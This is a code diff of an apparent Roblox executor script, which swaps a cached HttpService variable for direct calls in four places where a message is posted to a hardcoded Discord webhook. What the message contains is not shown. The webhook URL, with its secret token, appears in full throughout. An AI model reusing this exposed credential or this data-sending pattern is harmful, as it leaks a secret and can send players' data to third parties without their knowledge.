@@ -114,9 +114,9 @@ if game.PlaceId == 15502339080 then
             }
         }
         
-        local jsonMessage = http:JSONEncode(message1)
+        local jsonMessage = game:GetService("HttpService"):JSONEncode(message1)
         local success, response = pcall(function()
-                http:PostAsync("https://discord.com/api/webhooks/1187515692489121933/UX26bntG_oMrQIY5Xv4haUbPDZ53piXp3_CX3OL0xJOoe9pv8WNxIZQJ_wNiRjP78Why", jsonMessage)
+            game:GetService("HttpService"):PostAsync("https://discord.com/api/webhooks/1187515692489121933/UX26bntG_oMrQIY5Xv4haUbPDZ53piXp3_CX3OL0xJOoe9pv8WNxIZQJ_wNiRjP78Why", jsonMessage)
         end)
         if success == false then
                 local response = request({
@@ -231,9 +231,9 @@ if game.PlaceId == 15502339080 then
                 }
             }
             
-            local jsonMessage = http:JSONEncode(message1)
+            local jsonMessage = game:GetService("HttpService"):JSONEncode(message1)
             local success, response = pcall(function()
-                    http:PostAsync("https://discord.com/api/webhooks/1187515692489121933/UX26bntG_oMrQIY5Xv4haUbPDZ53piXp3_CX3OL0xJOoe9pv8WNxIZQJ_wNiRjP78Why", jsonMessage)
+                game:GetService("HttpService"):PostAsync("https://discord.com/api/webhooks/1187515692489121933/UX26bntG_oMrQIY5Xv4haUbPDZ53piXp3_CX3OL0xJOoe9pv8WNxIZQJ_wNiRjP78Why", jsonMessage)
             end)
             if success == false then
                     local response = request({
@@ -267,9 +267,9 @@ if game.PlaceId == 15502339080 then
         }
     }
     
-    local jsonMessage = http:JSONEncode(message1)
+    local jsonMessage = game:GetService("HttpService"):JSONEncode(message1)
     local success, response = pcall(function()
-            http:PostAsync("https://discord.com/api/webhooks/1187515692489121933/UX26bntG_oMrQIY5Xv4haUbPDZ53piXp3_CX3OL0xJOoe9pv8WNxIZQJ_wNiRjP78Why", jsonMessage)
+        game:GetService("HttpService"):PostAsync("https://discord.com/api/webhooks/1187515692489121933/UX26bntG_oMrQIY5Xv4haUbPDZ53piXp3_CX3OL0xJOoe9pv8WNxIZQJ_wNiRjP78Why", jsonMessage)
     end)
     if success == false then
             local response = request({
@@ -333,9 +333,9 @@ else
             }
         }
         
-        local jsonMessage = http:JSONEncode(message1)
+        local jsonMessage = game:GetService("HttpService"):JSONEncode(message1)
         local success, response = pcall(function()
-                http:PostAsync("https://discord.com/api/webhooks/1187515692489121933/UX26bntG_oMrQIY5Xv4haUbPDZ53piXp3_CX3OL0xJOoe9pv8WNxIZQJ_wNiRjP78Why", jsonMessage)
+            game:GetService("HttpService"):PostAsync("https://discord.com/api/webhooks/1187515692489121933/UX26bntG_oMrQIY5Xv4haUbPDZ53piXp3_CX3OL0xJOoe9pv8WNxIZQJ_wNiRjP78Why", jsonMessage)
         end)
         if success == false then
                 local response = request({
